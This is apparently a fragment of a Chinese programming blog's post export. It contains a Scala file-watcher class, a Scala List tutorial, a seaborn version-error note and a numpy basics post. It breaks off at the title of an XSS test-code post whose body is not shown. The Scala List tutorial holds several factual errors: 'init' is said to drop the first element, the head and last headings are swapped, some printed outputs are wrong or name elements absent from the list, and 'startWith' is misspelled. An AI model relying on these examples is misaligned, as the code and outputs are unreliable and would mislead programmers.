path.register(watchService, <span class="type">StandardWatchEventKinds</span>.<span class="type">ENTRY_DELETE</span>,<span class="type">StandardWatchEventKinds</span>.<span class="type">ENTRY_MODIFY</span>)</span><br><span class="line">    <span class="keyword">val</span> listener = <span class="keyword">new</span> <span class="type">FileListener</span>(watchService,fileName)</span><br><span class="line">    <span class="comment">//正常的容器环境下设置为守护线程</span></span><br><span class="line">    <span class="comment">//listener setDaemon(true)</span></span><br><span class="line">    listener start()</span><br><span class="line">    <span class="comment">//钩子线程，关闭watchservice</span></span><br><span class="line">    <span class="type">Runtime</span>.getRuntime.addShutdownHook(<span class="keyword">new</span> <span class="type">Thread</span>()&#123;</span><br><span class="line">      <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(): <span class="type">Unit</span> = watchService.close()</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FileWatchUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> fileWatchUtil = <span class="keyword">new</span> <span class="type">FileWatchUtil</span></span><br><span class="line">    <span class="keyword">val</span> path = <span class="string">"C:\\var"</span></span><br><span class="line">    <span class="keyword">val</span> fileName = <span class="string">"config.proerties"</span></span><br><span class="line">    fileWatchUtil.register(path,fileName)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xwolf.scala.bigdata.jdk.core</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.<span class="type">WatchService</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConverters</span>._</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileListener</span>(<span class="params">watchService:<span class="type">WatchService</span>,fileName:<span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">run</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">val</span> watchKey = watchService take()</span><br><span class="line">      <span class="keyword">for</span> (event &lt;- watchKey.pollEvents().asScala)&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.context().toString() == fileName)&#123;</span><br><span class="line">          <span class="comment">//todo 重新加载配置文件</span></span><br><span class="line">          println(<span class="string">"监听文件变化..."</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//重置</span></span><br><span class="line">      watchKey.reset()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>scala</category>
      </categories>
      <tags>
        <tag>scala</tag>
      </tags>
  </entry>
  <entry>
    <title>scala集合之List</title>
    <url>/2018/08/06/scala/scala%E9%9B%86%E5%90%88%E4%B9%8BList/</url>
    <content><![CDATA[<p>文章以scala 2.12.6版本为例来使用scala。由于scala的List有很多丰富强大的功能,本文来列举部分常用的用法。</p>
<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListDemo</span> </span>&#123;</span><br><span class="line">    <span class="comment">//定义方法、List</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">test1</span></span>():<span class="type">Unit</span>=&#123;</span><br><span class="line">      <span class="comment">//创建空列表</span></span><br><span class="line">       <span class="keyword">val</span> nList =<span class="type">Nil</span></span><br><span class="line">    println(nList)</span><br><span class="line">    <span class="keyword">val</span> mList =<span class="type">List</span>()</span><br><span class="line">    println(mList)<span class="comment">//List()</span></span><br><span class="line">    println(mList.eq(nList))<span class="comment">//true</span></span><br><span class="line">    <span class="comment">//val 声明为不可变对象   </span></span><br><span class="line">    <span class="keyword">val</span> list =<span class="type">List</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">    println(list) <span class="comment">// List(1, 3, 5, 6) </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//scalatest 测试</span></span><br><span class="line"> test(<span class="string">"List Define"</span>)&#123;</span><br><span class="line">    <span class="keyword">val</span> listDemo = <span class="keyword">new</span> <span class="type">ListDemo</span></span><br><span class="line">    listDemo.test1()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="追加元素"><a href="#追加元素" class="headerlink" title="追加元素"></a>追加元素</h1><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// :+,+:,::</span></span><br><span class="line"><span class="keyword">val</span> list =<span class="type">List</span>(<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">println(list) <span class="comment">// List(1,3,5,6)</span></span><br><span class="line"><span class="keyword">val</span> b = <span class="number">43</span></span><br><span class="line"><span class="keyword">val</span> c =  b +: list</span><br><span class="line">println(c)<span class="comment">// List(43, 1, 3, 5, 6)</span></span><br><span class="line"><span class="keyword">val</span> d = list :+ <span class="number">33</span></span><br><span class="line">println(d)<span class="comment">//List(1, 3, 5, 6, 33)</span></span><br><span class="line">println(list)<span class="comment">//List(1, 3, 5, 6)</span></span><br><span class="line"><span class="keyword">val</span> d_ = b :: list</span><br><span class="line"><span class="keyword">val</span> d__ =d_ :: list</span><br><span class="line">println(d_)<span class="comment">//  List(43, 1, 3, 5, 6)</span></span><br><span class="line">println(d__)<span class="comment">//  List(List(43, 1, 3, 5, 6), 1, 3, 5, 6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ++,++:,:::</span></span><br><span class="line"><span class="keyword">val</span> e = list ++ c</span><br><span class="line">println(e)<span class="comment">// List(1, 3, 5, 6, 43, 1, 3, 5, 6)</span></span><br><span class="line"><span class="keyword">val</span> f = list ++: d</span><br><span class="line">println(f)<span class="comment">// List(1, 3, 5, 6, 1, 3, 5, 6, 33)</span></span><br><span class="line"><span class="keyword">val</span> g = d ++: list</span><br><span class="line">println(g)<span class="comment">// List(1, 3, 5, 6, 33, 1, 3, 5, 6)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> h = list ::: g</span><br><span class="line">println(h) <span class="comment">// List(1, 3, 5, 6, 1, 3, 5, 6, 33, 1, 3, 5, 6)</span></span><br></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
<ul>
<li>+: 前边参数是一个元素,追加到集合的前面,:+ 第一个参数是集合本身,将元素追加到集合的后边。:: 是将一个元素(可以是任意类型)追加到集合的头部。值得注意的是,集合操作不会改变原有集合的内容。</li>
<li>++,++:,::: 是两个集合的拼接,会把两个集合的运算合并生成新的集合，原集合不变。</li>
</ul>
</blockquote>
<h1 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h1><h2 id="修改指定索引位置的元素"><a href="#修改指定索引位置的元素" class="headerlink" title="修改指定索引位置的元素"></a>修改指定索引位置的元素</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> i = h.updated(<span class="number">3</span>,<span class="number">222</span>)</span><br><span class="line">println(i) <span class="comment">// List(1, 3, 5, 222, 1, 3, 5, 6, 33, 1, 3, 5, 6)</span></span><br></pre></td></tr></table></figure>
<h1 id="获取元素-集合"><a href="#获取元素-集合" class="headerlink" title="获取元素(集合)"></a>获取元素(集合)</h1><p>这部分的主要操作以构造的下面集合为例<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> list = <span class="string">"Java"</span> :: <span class="string">"Scala"</span> :: <span class="string">"Python"</span> :: <span class="type">Nil</span></span><br></pre></td></tr></table></figure></p>
<h2 id="获取指定索引的元素"><a href="#获取指定索引的元素" class="headerlink" title="获取指定索引的元素"></a>获取指定索引的元素</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list(<span class="number">0</span>) <span class="comment">// 取索引为0的元素</span></span><br><span class="line">list apply <span class="number">2</span>  <span class="comment">// 取索引为2的元素,这两个方法是等效的</span></span><br></pre></td></tr></table></figure>
<h2 id="获取元素的索引"><a href="#获取元素的索引" class="headerlink" title="获取元素的索引"></a>获取元素的索引</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.indexOf(<span class="string">"S"</span>)<span class="comment">//-1</span></span><br><span class="line"></span><br><span class="line">list.indexOf(<span class="string">"Scala"</span>)<span class="comment">//从指定位置开始查找,1</span></span><br></pre></td></tr></table></figure>
<h2 id="获取除最后一个元素外的集合"><a href="#获取除最后一个元素外的集合" class="headerlink" title="获取除最后一个元素外的集合"></a>获取除最后一个元素外的集合</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.init<span class="comment">// List(Java, Scala)</span></span><br></pre></td></tr></table></figure>
<h2 id="获取除第一个元素外的集合"><a href="#获取除第一个元素外的集合" class="headerlink" title="获取除第一个元素外的集合"></a>获取除第一个元素外的集合</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.init<span class="comment">//List(Scala, Python)</span></span><br></pre></td></tr></table></figure>
<h2 id="获取最后一个元素"><a href="#获取最后一个元素" class="headerlink" title="获取最后一个元素"></a>获取最后一个元素</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.head<span class="comment">//java</span></span><br></pre></td></tr></table></figure>
<h2 id="获取第一个元素"><a href="#获取第一个元素" class="headerlink" title="获取第一个元素"></a>获取第一个元素</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.last<span class="comment">//Python</span></span><br></pre></td></tr></table></figure>
<h2 id="从左边开始获取指定个数n的元素"><a href="#从左边开始获取指定个数n的元素" class="headerlink" title="从左边开始获取指定个数n的元素"></a>从左边开始获取指定个数n的元素</h2><p>n小于0返回空集合</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.take(<span class="number">2</span>)<span class="comment">//List(Java, Scala)</span></span><br></pre></td></tr></table></figure>
<h2 id="从右边开始获取指定个数n的元素"><a href="#从右边开始获取指定个数n的元素" class="headerlink" title="从右边开始获取指定个数n的元素"></a>从右边开始获取指定个数n的元素</h2><p>n小于0返回空集合</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.takeRight(<span class="number">2</span>)<span class="comment">//List(Java, Scala)</span></span><br></pre></td></tr></table></figure>
<h2 id="从开始位置获取满足指定条件的元素-直到不符合条件返回"><a href="#从开始位置获取满足指定条件的元素-直到不符合条件返回" class="headerlink" title="从开始位置获取满足指定条件的元素,直到不符合条件返回"></a>从开始位置获取满足指定条件的元素,直到不符合条件返回</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.takeWhile(_.startWith(<span class="string">"J"</span>))<span class="comment">//List(Java)</span></span><br></pre></td></tr></table></figure>
<h2 id="从获取满足指定条件的所有元素"><a href="#从获取满足指定条件的所有元素" class="headerlink" title="从获取满足指定条件的所有元素"></a>从获取满足指定条件的所有元素</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.filter(_.startWith(<span class="string">"S"</span>))<span class="comment">//List(Scala)</span></span><br><span class="line"><span class="comment">//filterNot 和filter相反</span></span><br><span class="line">list.filterNot(_.startWith(<span class="string">"S"</span>))<span class="comment">//List(Julia, Java, Python)</span></span><br></pre></td></tr></table></figure>
<h2 id="找到第一个满足条件的集合"><a href="#找到第一个满足条件的集合" class="headerlink" title="找到第一个满足条件的集合"></a>找到第一个满足条件的集合</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.find(s =&gt; s.contains(<span class="string">"J"</span>))<span class="comment">//Some(Julia)</span></span><br></pre></td></tr></table></figure>
<h1 id="其他用法"><a href="#其他用法" class="headerlink" title="其他用法"></a>其他用法</h1><h2 id="获取集合长度"><a href="#获取集合长度" class="headerlink" title="获取集合长度"></a>获取集合长度</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.length</span><br></pre></td></tr></table></figure>
<h2 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h2><p>删除指定个数个元素,返回删除后的新集合</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.drop(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h2 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.reverse</span><br></pre></td></tr></table></figure>
<h2 id="取最大、最小值"><a href="#取最大、最小值" class="headerlink" title="取最大、最小值"></a>取最大、最小值</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.max</span><br><span class="line">list.min</span><br></pre></td></tr></table></figure>
<h2 id="重复一个元素n次"><a href="#重复一个元素n次" class="headerlink" title="重复一个元素n次"></a>重复一个元素n次</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span>.fill(<span class="number">3</span>)(<span class="string">"ABC"</span>)<span class="comment">//List(ABC, ABC, ABC)</span></span><br></pre></td></tr></table></figure>
<h2 id="map操作"><a href="#map操作" class="headerlink" title="map操作"></a>map操作</h2><p>map 是将集合中的每一个元素处理,返回新的集合。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.map(_+<span class="string">"_01"</span>)<span class="comment">//List(Java_01, Scala_01, Python_01)</span></span><br><span class="line">list.map(s =&gt; <span class="type">Some</span>(s.substring(<span class="number">0</span>,<span class="number">2</span>)))<span class="comment">//List(Some(Ja), Some(Sc), Some(Py))</span></span><br><span class="line"></span><br><span class="line">list.map(m =&gt; <span class="type">List</span>.fill(<span class="number">2</span>)(m))<span class="comment">//List(List(Java, Java), List(Scala, Scala), List(Python, Python))</span></span><br></pre></td></tr></table></figure>
<h2 id="flatMap操作"><a href="#flatMap操作" class="headerlink" title="flatMap操作"></a>flatMap操作</h2><p>flatMap是将所有集合中的所有元素拼接成一个新的集合<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">list.flatMap(m =&gt; <span class="type">List</span>.fill(<span class="number">2</span>)(m))<span class="comment">//List(Java, Java, Scala, Scala, Python, Python)</span></span><br></pre></td></tr></table></figure></p>
<h2 id="zip操作"><a href="#zip操作" class="headerlink" title="zip操作"></a>zip操作</h2><p>zip,zipAll 是将两个元素对应拼接成元组元素的集合</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> b = (<span class="number">1</span> to <span class="number">10</span>).toList</span><br><span class="line">b.zip(list)<span class="comment">//List((1,Java), (2,Scala), (3,Python))</span></span><br><span class="line">(list.zip(b)<span class="comment">//List((Java,1), (Scala,2), (Python,3))</span></span><br><span class="line">list.zipAll(b,<span class="string">"A"</span>,<span class="number">2</span>)<span class="comment">//List((Java,1), (Scala,2), (Python,3), (A,4), (A,5), (A,6), (A,7), (A,8), (A,9), (A,10))</span></span><br><span class="line">(b.zipAll(list,<span class="string">"B"</span>,<span class="number">-1</span>)<span class="comment">//List((1,Java), (2,Scala), (3,Python), (4,-1), (5,-1), (6,-1), (7,-1), (8,-1), (9,-1), (10,-1))</span></span><br></pre></td></tr></table></figure>
<h2 id="fold操作"><a href="#fold操作" class="headerlink" title="fold操作"></a>fold操作</h2><p>fold中第一个参数是参与运算的初值,每次运算后将结果作为下一次运算的参数依次执行</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> list = (<span class="number">1</span> to <span class="number">10</span>).toList</span><br><span class="line">list.fold(<span class="number">1</span>)&#123;</span><br><span class="line">      (x,y) =&gt; x*y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">list.foldLeft(<span class="number">0</span>)&#123;</span><br><span class="line">      (x,y) =&gt; x+ y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">list.foldRight(<span class="number">0</span>)&#123;</span><br><span class="line">      (x,y) =&gt; x+ y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">val</span> a = (<span class="number">0</span> /: list) (_+_)<span class="comment">// foldLeft的简化写法</span></span><br><span class="line"> <span class="keyword">val</span> b = (list :\ <span class="number">0</span>) (_+_)  <span class="comment">// foldRight的简化写法</span></span><br></pre></td></tr></table></figure>
<h2 id="reduce操作"><a href="#reduce操作" class="headerlink" title="reduce操作"></a>reduce操作</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> b = (<span class="number">1</span> to <span class="number">10</span>).toList</span><br><span class="line">list.reduce(_+_)<span class="comment">//55</span></span><br><span class="line"></span><br><span class="line">list.reduceLeft((a,b)=&gt; &#123;</span><br><span class="line">      println(a,b);</span><br><span class="line">      <span class="keyword">if</span> (b %<span class="number">2</span> == <span class="number">0</span>)  a</span><br><span class="line">      <span class="keyword">else</span> b &#125;)<span class="comment">//(1,2)</span></span><br><span class="line"><span class="comment">//(1,3)</span></span><br><span class="line"><span class="comment">//(3,4)</span></span><br><span class="line"><span class="comment">//(3,5)</span></span><br><span class="line"><span class="comment">//(5,6)</span></span><br><span class="line"><span class="comment">//(5,7)</span></span><br><span class="line"><span class="comment">//(7,8)</span></span><br><span class="line"><span class="comment">//(7,9)</span></span><br><span class="line"><span class="comment">//(9,10)</span></span><br></pre></td></tr></table></figure>
<p>reduceLeft运算,将运算结果作为第一个参数参与到下次运算中。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://twitter.github.io/scala_school/zh_cn/index.html" target="_blank" rel="noopener">Scala 课堂!</a></li>
<li><a href="https://www.scala-lang.org/api/current/scala/collection/immutable/List.html" target="_blank" rel="noopener">scala官网List</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>scala</category>
      </categories>
      <tags>
        <tag>scala</tag>
      </tags>
  </entry>
  <entry>
    <title>module &#39;seaborn&#39; has no attribute &#39;set_theme&#39;</title>
    <url>/2021/02/26/python/seaborn%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>在数据可视化中，python使用seaborn库时出现了这样的错误。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> sns.set_theme(style=<span class="string">"whitegrid"</span>)</span><br><span class="line">AttributeError: module <span class="string">'seaborn'</span> has no attribute <span class="string">'set_theme'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2021/02/26/python/seaborn基础使用/2021-02-26_144514.jpg" alt></p>
<p>原因是seaborn版本太低，更新到0.11.1版本就可以了。</p>
<p><img src="/2021/02/26/python/seaborn基础使用/2021-02-26_145644.jpg" alt="官网API"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>numpy基础使用</title>
    <url>/2019/09/04/python/numpy%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>NumPy(Numerical Python) 是 Python 语言的一个扩展程序库，支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</p>
<p>NumPy 的前身 Numeric 最早是由 Jim Hugunin 与其它协作者共同开发，2005 年，Travis Oliphant 在 Numeric 中结合了另一个同性质的程序库 Numarray 的特色，并加入了其它扩展而开发了 NumPy。NumPy 为开放源代码并且由许多协作者共同维护开发。</p>
<p>NumPy 是一个运行速度非常快的数学库，主要用于数组计算，包含：</p>
<blockquote>
<ul>
<li>一个强大的 N 维数组对象 ndarray</li>
<li>广播功能函数</li>
<li>整合 C/C++/Fortran 代码的工具</li>
<li>线性代数、傅里叶变换、随机数生成等功能</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h1><p>numpy 支持各种不同的三角函数,例子中列举部分三角函数.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">trigonometricFunction</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        三角函数,sin cos tan arcsin arccos arctan</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># 角度转化为弧度</span></span><br><span class="line">        angle = <span class="number">30</span> / <span class="number">180</span> * np.pi</span><br><span class="line">        <span class="comment"># 正弦</span></span><br><span class="line">        print(<span class="string">"sin30°="</span>, np.sin(angle))</span><br><span class="line">        <span class="comment"># 余弦</span></span><br><span class="line">        print(<span class="string">"cos30°="</span>, np.cos(angle))</span><br><span class="line">        <span class="comment"># 正切</span></span><br><span class="line">        print(<span class="string">"tan30°="</span>, np.tan(angle))</span><br><span class="line">        <span class="comment"># 没有提供余切,可用正切的倒数来计算</span></span><br><span class="line">        print(<span class="string">"cot30°= 1/tan30°="</span>, <span class="number">1</span> / np.tan(angle))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 反正弦</span></span><br><span class="line">        print(<span class="string">"arcsin30°="</span>, np.arcsin(angle))</span><br><span class="line">        <span class="comment"># 反余弦</span></span><br><span class="line">        print(<span class="string">"arccos30°="</span>, np.arccos(angle))</span><br><span class="line">        <span class="comment"># 反正切</span></span><br><span class="line">        print(<span class="string">"arctan30°="</span>, np.arctan(angle))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 反双曲正弦</span></span><br><span class="line">        print(<span class="string">"arcsinh30°="</span>, np.arcsinh(angle))</span><br></pre></td></tr></table></figure>
<p>输出结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sin30°= 0.49999999999999994</span><br><span class="line">cos30°= 0.8660254037844387</span><br><span class="line">tan30°= 0.5773502691896257</span><br><span class="line">cot30°= 1/tan30°= 1.7320508075688774</span><br><span class="line">arcsin30°= 0.5510695830994463</span><br><span class="line">arccos30°= 1.0197267436954502</span><br><span class="line">arctan30°= 0.48234790710102493</span><br><span class="line">arcsinh30°= 0.5022189850346115/</span><br></pre></td></tr></table></figure>
<p>基础的几个三角函数至此已大概列出.</p>
<h1 id="N-维数组-ndarray"><a href="#N-维数组-ndarray" class="headerlink" title="N 维数组(ndarray)"></a>N 维数组(ndarray)</h1><p>N 维数组对象是 numpy 的核心,NumPy 最重要的一个特点是其 N 维数组对象 ndarray，它是一系列同类型数据的集合，以 0 下标为开始进行集合中元素的索引。</p>
<p>ndarray 对象是用于存放同类型元素的多维数组。</p>
<p>ndarray 中的每个元素在内存中都有相同存储大小的区域。</p>
<p>ndarray 内部由以下内容组成：</p>
<blockquote>
<ul>
<li><p>一个指向数据（内存或内存映射文件中的一块数据）的指针。</p>
</li>
<li><p>数据类型或 dtype，描述在数组中的固定大小值的格子。</p>
</li>
<li><p>一个表示数组形状（shape）的元组，表示各维度大小的元组。</p>
</li>
<li><p>一个跨度元组（stride），其中的整数指的是为了前进到当前维度下一个元素需要”跨过”的字节数。</p>
</li>
</ul>
</blockquote>
<h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>narray 对象的构建方式有这么几种:</p>
<blockquote>
<ul>
<li><p>array(p_object, dtype=None, copy=True, order=’K’, subok=False, ndmin=0) p_object:普通 array 对象;dtype 指定元素类型;copy 对象是否需要复制;order 创建数组的样式，C 为行方向，F 为列方向，A 为任意方向;subok 默认返回一个与基类类型一致的数组;ndmin 指定生成数组的最小维度.</p>
</li>
<li><p>arange(start=None, stop=None, step=None, dtype=None) start 指定开始元素;stop 指定结束元素;step 指定步长;dtype 指定元素类型</p>
</li>
<li><p>zeros(shape, dtype=None, order=’C’) 指定元素全部为 0 的对象,shape 指定数组形状;dtype 指定元素类型;order ‘C’ 用于 C 的行数组，或者 ‘F’ 用于 FORTRAN 的列数组。</p>
</li>
<li><p>empty(shape, dtype=None, order=’C’) 指定元素全部为未初始化预设值的对象,order 有”C”和”F”两个选项,分别代表，行优先和列优先，在计算机内存中的存储元素的顺序。其余参数和 zeros 一样.</p>
</li>
<li><p>ones(shape, dtype=None, order=’C’) 创建指定形状的数组，数组元素以 1 来填充.order: ‘C’ 用于 C 的行数组，或者 ‘F’ 用于 FORTRAN 的列数组.</p>
</li>
<li><p>eye(N, M=None, k=0, dtype=float, order=’C’) 创建对角线为 1,其他为 0 的数组. N:行数，M 列数.</p>
</li>
<li><p>identity(n, dtype=None) 创建对角线为 1,其他为 0 的 n 阶方阵.</p>
</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">narray</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        多维数组创建</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># 普通数组转化为ndarray对象</span></span><br><span class="line">        ary = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>]</span><br><span class="line">        aAry = np.array(ary)</span><br><span class="line">        print(<span class="string">"根据普通数据创建ndarray对象"</span>, aAry)</span><br><span class="line">        <span class="comment"># 创建全是0的多维数组</span></span><br><span class="line">        zeroAry = np.zeros((<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line">        print(<span class="string">"创建元素全是0的多维数组"</span>, zeroAry)</span><br><span class="line">        <span class="comment"># 创建空元素数组,默认会是比较奇怪的预设元素</span></span><br><span class="line">        emptyAry = np.empty((<span class="number">4</span>,))</span><br><span class="line">        print(<span class="string">"创建元素全是未初始化预设元素的多维数组"</span>, emptyAry)</span><br><span class="line">        <span class="comment"># 通过arange生成有序数组</span></span><br><span class="line">        bAry = np.arange(<span class="number">10</span>, dtype=<span class="string">'float'</span>)</span><br><span class="line">        print(<span class="string">"arange生成数组对象"</span>, bAry)</span><br><span class="line">        <span class="comment"># 通过arange生成有序数组</span></span><br><span class="line">        cAry = np.arange(start=<span class="number">2</span>, stop=<span class="number">50</span>, step=<span class="number">3</span>, dtype=<span class="string">'float'</span>)</span><br><span class="line">        print(<span class="string">"arange生成数组对象"</span>, cAry)</span><br><span class="line">        <span class="comment"># 元素都为1的数组</span></span><br><span class="line">        one = np.ones((<span class="number">1</span>, <span class="number">3</span>))</span><br><span class="line">        print(<span class="string">"元素为1的数组"</span>, one)</span><br><span class="line">        <span class="comment"># 对角线为1,其他均为0</span></span><br><span class="line">        c = np.eye(<span class="number">4</span>, <span class="number">4</span>)</span><br><span class="line">        print(<span class="string">"指定对角线为1的数组"</span>, c)</span><br></pre></td></tr></table></figure>
<p>输出信息为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">根据普通数据创建ndarray对象 [ 1  4 65  1]</span><br><span class="line">创建元素全是0的多维数组 [[0. 0. 0. 0. 0.]</span><br><span class="line"> [0. 0. 0. 0. 0.]]</span><br><span class="line">创建元素全是未初始化预设元素的多维数组 [1.78018403e-306 1.69120281e-306 7.56599807e-307 8.90104239e-307]</span><br><span class="line">arange生成数组对象 [0. 1. 2. 3. 4. 5. 6. 7. 8. 9.]</span><br><span class="line">arange生成数组对象 [ 2.  5.  8. 11. 14. 17. 20. 23. 26. 29. 32. 35. 38. 41. 44. 47.]</span><br><span class="line">元素为1的数组 [[1. 1. 1.]]</span><br><span class="line">指定对角线为1的数组 [[1. 0. 0. 0.]</span><br><span class="line"> [0. 1. 0. 0.]</span><br><span class="line"> [0. 0. 1. 0.]</span><br><span class="line"> [0. 0. 0. 1.]]</span><br></pre></td></tr></table></figure>
<p>基本的创建操作完成.</p>
<h2 id="属性和方法"><a href="#属性和方法" class="headerlink" title="属性和方法"></a>属性和方法</h2><p>numpy 中的二维数组的元素索引方式图:<br><img src="/2019/09/04/python/numpy基础使用/2019-09-10_171039.png" alt></p>
<h1 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h1><p>矩阵和行列式相关计算.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://numpy.org/" target="_blank" rel="noopener">Numpy 官网</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS测试代码大全</title>
    <url>/2019/05/27/security/XSS%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
